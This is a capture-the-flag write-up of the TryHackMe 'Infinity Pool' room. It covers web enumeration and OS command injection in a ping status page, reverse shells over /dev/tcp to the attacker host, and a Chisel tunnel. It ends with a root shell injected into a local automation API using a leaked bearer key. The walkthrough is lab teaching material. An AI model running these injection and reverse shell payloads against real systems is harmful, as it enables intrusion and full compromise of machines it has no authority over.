<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# Infinity Pool

| **Room Name** | Infinity Pool |
|--------------|---------------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 |
| **Points** | 90 |
| **Category** | 🐚 Boot2Root |
| **Difficulty** | Medium |
| **Tags** | Linux, Boot2Root, Privilege Escalation, Enumeration |
| **Status** | ✅ Completed |

## Room Information

```text
Type: CTF Challenge
Difficulty: Medium
Category: Boot2Root

Description:
No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.
```

## Challenge Overview

**Hacker Holidays: Day 11 — Infinity Pool**

The Byte Lotus Hotel appears to offer guests a seamless technology powered experience, but hidden systems exist beyond the intended network. Through careful enumeration, exploitation, and privilege escalation, the objective is to compromise the target machine, obtain user access, and ultimately gain root privileges to recover both challenge flags.

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/6ae51588-c97a-4c16-8772-3994b86f2042" />
</p>

## Objectives

- Find the user flag
- Find the root flag

## Solution

- From the challenge description, I noticed two things. `Powered by modern technology` might mean maybe the hotel runs more than just a website and there might be backend services, automation, and management tools working behind the scenes. Furthermore, `The most interesting systems are the ones guests were never meant to see` might mean there are hidden or staff-only areas. There could be internal services as well on the hotel's private network or even deeper services that we might not know of

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/5a853726-a759-431c-8b02-ee36b87c64fb" />
</p>

- I went to the website above try to poke around but all the buttons were greyed out and there wasn't really much to do

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/d1147518-6cdb-47a8-b186-0a98b77e4b6c" />
</p>

- Then, based on the observations I made earlier, I decided to enumerate the web application for hidden directories and endpoints using Gobuster, as these often reveal functionality that is not accessible through the website's navigation. As we can see below, I found `/status` and `/robots.txt` which I could have not known before
```
gobuster dir -u http://10.65.181.51 -w /usr/share/wordlists/dirb/common.txt
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/adfb8e7f-53ea-4621-93d3-41e0c2cb916b" />
</p>

- Here, we can see on this `/status` page that it appeared to be a tool for checking whether another hotel property's server was online. The input box asked for a property host (such as an IP address like `10.0.0.5`), and the page explained that it was used to confirm a remote property was reachable before transferring a guest

- I pinged `10.0.0.5` and it was successful here
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/24e9b1c5-306e-4d02-b806-6cb9584fb898" />
</p>

- Now I noticed that this looked like a possible OS command injection point because these types of features are often built by running the computer's built-in `ping` command. Developers sometimes use functions like Python's `os.system()`, which simply runs a command on the operating system

- If the user's input is passed directly into that command without being checked properly, the application may end up running something it wasn't supposed to. Since this page only expected a simple IP address, it seemed like a good place to test whether the input was being handled securely

- To check this, I submitted a harmless command injection test payload such as `10.0.0.5;whoami`. If the application was passing my input directly to the operating system, the `whoami` command would execute after the ping command, indicating that command injection was possible

```
10.0.0.5;whoami
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/644e3faf-ad82-417f-b7f1-505c8c4503cf" />
</p>

- As you can see above, we successfully demonstrated OS command injection attack. We can see the username is `web`. The next thing was to get a reverse shell like we have done with past challenges. I first started up the Netcat listener to catch the shell

```
10.0.0.5;/bin/bash -c 'bash -i >& /dev/tcp/10.113.119.207/4444 0>&1' 
```

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/f2955ff2-61d2-4997-8e61-c6b16c07e16b" />
</p>

- I inputted the IP and reverse shell separated by a `;` and clicked the box `Check`
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/60fd96de-2f2d-420d-8089-7cff1693ae27" />
</p>

- BOOM!, as you can see we got the shell 
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/b57e015a-b288-46e7-ac30-d572fcd3b35d" />
</p>

- I successfully navigated my way into `/home` and then `/web` and retrieved the flag
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/aef6ff0e-489d-48ce-8a33-528ac0ff2e9b" />
</p>

- To get the root flag, one of the first commands I ran was `ps aux | grep root` to look for processes running with root privileges. The output showed several services running as root, including a Gunicorn web application process as highlighted below on `127.0.0.1:9000`. This was interesting because the application was running as the root user, which could potentially provide a path for privilege escalation if the web application contained a vulnerability or misconfiguration

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/fc92766b-9e26-4d03-aaf9-f94f3d056955" />
</p>

- After reviewing the processes running as root, the next step was to identify what services were active on the machine and what ports they were listening on. To do this, I used `ss -tulpn`, which displayed listening sockets along with the associated processes when available. This helped narrow down potential services that could be useful for further privilege escalation

```
ss -tulpn
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e05a2345-ebfa-4b6c-b428-485f0370ea96" />
</p>

- The results showed several listening ports besides the web server on port `80`, including `5038`, `3000`, `3306`, `8080`, `8088`, and `8089`. Some of these were easy to identify based on their default port numbers. For example, `3306` is the default port for MySQL. Ports `5038`, `8088`, and `8089` are commonly used by Asterisk, an open-source phone system. We also notice there is that same service listening on port `9000` we identified via `ps aux`. I noted this down that this could become important as this might be our way to privilege escalation 

- I then decided to curl the web-looking ones first as well as port `9000`
```
curl -s http://127.0.0.1:8088/
curl -s http://127.0.0.1:8089/
curl -s http://127.0.0.1:8080/
curl -s http://127.0.0.1:9000/
curl -s http://127.0.0.1:3000/
```
- Port `8080` returned the stock Apache2 Ubuntu default page, confirming a real web server was running there but with nothing deployed at the document root which might be worth revisiting later once a specific path was known but for now was a dead end

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/05fb24d1-0453-4488-bcfe-5df776861e6a" />
</p>

- Port `8088` and `8089` didn't really return anything and were likely Asterisk related ports (common defaults for its built in HTTP/manager interfaces) that either weren't fully configured or required a specific path/protocol not served on a bare GET to `/`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/780bec76-cb64-4abf-8ed0-168d57b28a5a" />
</p>

- I tried curling port `9000` but that did not return anything and instead I got a error message
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/05887560-0677-4795-9480-fa6fdf554338" />
</p>

- However, port `3000` was the interesting one and was running a private admin page called `Watchtower — ops console`. It was designed to be accessed only from the same computer (using `127.0.0.1`), so it didn't require a username or password. Instead, it assumed that if something could reach it, it was already trusted. The page showed basic system information and even listed two available API endpoints: `/api/health` and `/api/config`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2ff96e83-3b2e-4ad2-b77b-53bc7ad885f7" />
</p>

- Next step was to curl them directly
```
curl -s http://127.0.0.1:3000/api/health
curl -s http://127.0.0.1:3000/api/config
```

- `/api/health` returned a simple status check confirming the service name and bind address, useful mainly as a check that the API was actually responding as expected before moving on

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/8cc9ee4a-e479-4346-a800-74365a9625bc" />
</p>

- The `/api/config` was an interesting one because it accidentally exposed sensitive internal settings. It revealed that another internal automation endpoint was running on `127.0.0.1:9000` and, more importantly, included a `ops_note` saying a FreePBX User Control Panel (UCP) account was still using default credentials. The response even contained the username, password, and the internal login page URL which was `http://127.0.0.1:8080/ucp`

```
"telephony_user":"FreePBXUCPTemplateCreator"
"telephony_pass":"St4yN0t1c3d_2026"
"telephony_portal":"http://127.0.0.1:8080/ucp"
```

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e9b24df8-bba7-40fa-96eb-1a15fe578467" />
</p>

- Before I tried going to the website, I was curious and checked the automation endpoint on port `9000` that was just mentioned. Rather than guessing at routes, I tried the most common convention for internal service APIs first which was a health/status check

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/bb13e277-fc27-428a-9682-02f94ae9a7c2" />
</p>

- We can see above it required some type of automation key which I did not have. Without the key, I could not access the export function, so I needed to look for another way to find the missing credential

- Now the issue was when I tried visiting the website `http://127.0.0.1:8080/ucp`, that did not quite work as seen below
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/f70c26e2-3d44-452b-b3a7-0b5e5c44811c" />
</p>

- The issue is the login page was only available on the target machine itself (`127.0.0.1`). If I entered that address in my own browser, it would open my own machine instead of the target's login page. The solution was to create a tunnel so I could open the target's internal login page in my own browser and log in as if I were using the target machine directly

- This is where Chisel came in. It works by tunneling traffic over a single outbound connection from the target back to my attacker machine and since I did the reverse shell, I already had proved the target could reach my AttackBox over the network, chisel could reuse that exact same trust relationship

- I first had to install chisel but the target had no `sudo/apt` access to install anything and so the workaround was to download the chisel binary onto the AttackBox first, host it with a web server (`python3 -m http.server 8888`), and curl it down onto the target through the existing reverse shell

```
cd ~
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
./chisel --version
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/05f2e63d-ebfa-4dc1-9574-a5da37c8ef53" />
</p>

- I hosted the Python server as seen below
```
cd ~
python3 -m http.server 8888
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/dd359b61-80cb-4c2a-8aa8-7a89defa6d4c" />
</p>

- For later use but in a third terminal I started the chisel server and left this running for now
```
chisel server -p 8000 --reverse
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a23a05f0-0b92-447a-aa18-1406e02df1df" />
</p>

- On the reverse shell, I moved to `/tmp` and downloaded the Chisel binary from my machine using `curl`, saving it as `chisel`. I verified the file type, made it executable with `chmod +x`, and confirmed the permissions and successful download using `ls -la`
```
cd /tmp
curl -s http://10.67.102.97:8888/chisel -o chisel
file chisel
chmod +x chisel
ls -la chisel
```
<p align="center">
<img width="1512" height="796" alt="image" src="https://github.com/user-attachments/assets/c49cb74e-8dbf-4625-9d62-31df3da64f71" />
</p>

- Last thing was to connect to the chisel server that I had left running in earlier steps. As you can see below we are successfully connected to the chisel server
```
./chisel client 10.67.102.97:8000 R:8080:127.0.0.1:8080
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/4e9db3d0-7cb5-4ffc-9264-cc3b09cee3ba" />
</p>

- With the tunnel established, we can now browse to the UCP portal directly at `http://127.0.0.1:8080/ucp` from our AttackBox. I entered in the credentials I had gotten earlier and clicked `Login`
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/77a4a046-9437-46fd-9830-8fefcae12ea1" />
</p>

- I was a bit lost when I got here so the next step was enumeration and find out what this specific account could actually do. I noticed on the top left, there was a green `+` symbol where I could add dashboard widgets
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a03a2673-f939-4720-a1c1-104e2980b9c0" />
</p>

- I tried to add a widget but it gave me a error message that there was no existing dashboard to add the widgets to so I had to create the dashboard first
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/30008d36-879f-4ea1-80a2-bab94b412c55" />
</p>

- This time I clicked on the green `+` circle on the top right and I could create a dashboard here. I gave it a random name here
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/4cd8139b-7402-4495-89bf-6202b203a9e3" />
</p>

- I added all the widgets and then I noticed specifically in the `Voicemail` widget, there was some type of automation key that matched the exact port we had already found. This was the root owned Gunicorn service bound to `127.0.0.1:9000` we had found earlier and confirmed via `ps aux`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/84b0d5e4-7f49-4876-9373-37df854f4f8f" />
</p>

- With this key in hand, I remembered the `/jobs/export` endpoint discovered earlier on the port `9000` automation service, which explicitly required an `Authorization: Bearer <automation key> header`. This looked like the kind of credential that endpoint was expecting

- I sent a POST request to `/jobs/export`, authenticating with the recovered key and injecting a reverse shell payload into the report field, using `;` to chain an additional command and `#` to comment out anything the application appended afterward
```
curl -s -X POST http://127.0.0.1:9000/jobs/export -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" -H "Content-Type: application/json" -d '{"report":"test; bash -c \"bash -i >& /dev/tcp/10.67.102.97/4445 0>&1\" #"}'
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/b53c90cd-36b7-4be0-8901-adf7ca7395a8" />
</p>

- I had successfully executed the reverse shell and I had root privileges now. It was easy enough to retrieve the root flag in the same way as I retrieved the user flag

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/88321cf5-1e70-4601-9240-9453ce4f5082" />
</p>

## Skills Learned

* Practiced web enumeration by using directory brute forcing to uncover hidden endpoints like `/status` and `/robots.txt`
* Learned how to identify potential OS command injection points in web applications that process user input
* Used command injection techniques to execute commands and establish a reverse shell
* Improved Linux enumeration skills by analyzing running processes, open ports, and local services
* Learned how to investigate root running services and identify possible privilege escalation opportunities
* Practiced discovering internal services that were not directly exposed externally through localhost enumeration
* Learned how exposed API endpoints can reveal sensitive configuration information and credentials
* Used Chisel to create a tunnel and access services restricted to the target machine's localhost
* Explored FreePBX UCP functionality and used discovered credentials to access an internal admin panel
* Learned how leaked automation keys can be used to interact with protected internal APIs
* Practiced exploiting a root-running Gunicorn service to gain higher privileges

## Tools Used

* Gobuster
* Netcat
* Curl
* Chisel
* Wget
* Python HTTP Server
* FreePBX UCP
* Linux
  * ss
  * ps
  * Bash

## Flags

🚩 User Flag: `THM{*************}`

🚩 Root Flag: `THM{******************}`
